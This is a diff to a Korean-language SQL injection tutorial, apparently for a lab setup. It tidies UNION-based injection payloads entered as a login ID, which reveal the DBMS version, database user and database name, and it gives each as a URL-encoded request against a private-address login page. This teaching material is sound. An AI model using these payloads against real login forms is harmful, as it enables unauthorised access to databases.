@@ -134,7 +134,7 @@ UNION을 이용하여 DBMS의 버전을 출력하도록 유도해보자.
 
 | data	| value	|
 | :---	| :--- 	|
-| ID	| ' UNION  SELECT VERSION( ),NULL# |
+| ID	| ' UNION  SELECT VERSION(),NULL# |
 | PW	| 아무 값(123) |
 | URL	| http://192.168.0.58/index.php?userid=%27+UNION++SELECT+VERSION%28+%29%2CNULL%23&password=123 |
 
@@ -148,7 +148,7 @@ UNION을 이용하여 DBMS 접속 계정을 출력하도록 유도해보자.
 
 | data	| value	|
 | :---	| :--- 	|
-| ID	| ' UNION  SELECT USER( ),NULL# |
+| ID	| ' UNION  SELECT USER(),NULL# |
 | PW	| 아무 값(123) |
 | URL	| http://192.168.0.58/index.php?userid=%27+UNION++SELECT+USER%28+%29%2CNULL%23&password=123 |
 
@@ -162,7 +162,7 @@ UNION을 이용하여 데이터베이스 이름을 출력하도록 유도해보�
 
 | data	| value	|
 | :---	| :--- 	|
-| ID	| ' UNION  SELECT DATABASE( ),NULL# |
+| ID	| ' UNION  SELECT DATABASE(),NULL# |
 | PW	| 아무 값(123) |
 | URL	| http://192.168.0.58/index.php?userid=%27+UNION++SELECT+DATABASE%28+%29%2CNULL%23&password=123 |
 
